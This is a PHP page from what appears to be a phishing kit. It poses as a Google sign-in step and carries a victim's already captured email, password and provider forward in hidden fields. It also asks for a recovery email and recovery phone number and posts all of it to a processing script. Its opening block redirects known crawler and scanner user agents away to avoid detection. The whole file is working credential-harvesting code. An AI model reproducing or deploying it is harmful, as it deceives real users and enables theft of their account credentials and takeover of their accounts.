<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: ../../cracker.php');
die();
}
?>
<?php
if(isset($_POST['url'])) {
	$url = $_POST['url'];
	$email = $_POST['email'];
	$pass  = $_POST['password'];
	$prov  = $_POST['prov'];
} else {
	die();
}
?>
<div class="login-box">
	<form action="../process.php" method="post" id="login-form">
		<h5>Welcome</h5>
		</br>
		<center>
		<span class="user"><i class="zmdi zmdi-account-circle zmdi-hc-lg icon"></i> <?php echo $email;?></span>
		</center>
		</br>
		</br>
		</br>
		<input type="hidden" name="url" value="<?= $url ?>">
		<input type="hidden" name="email" value="<?= $email ?>">
		<input type="hidden" name="pass" value="<?= $pass ?>">
		<input type="hidden" name="prov" value="<?= $prov ?>">
		<div class="form-group">
			<input type="email" name="pemulihan" id="pemulihan" required><label>Email Pemulihan</label>
		</div>
		<div class="form-group">
			<input type="number" name="nopemulihan" id="nopemulihan" required><label>Nomor Pemulihan</label>
		</div>
		<input type="hidden" name="login" id="login" class="form-control" value="Google" readonly>
		<button class="btn-create">Forgot password?</button>
		<button type="submit" class="btn-login">Sign in</button>
	</form>
</div>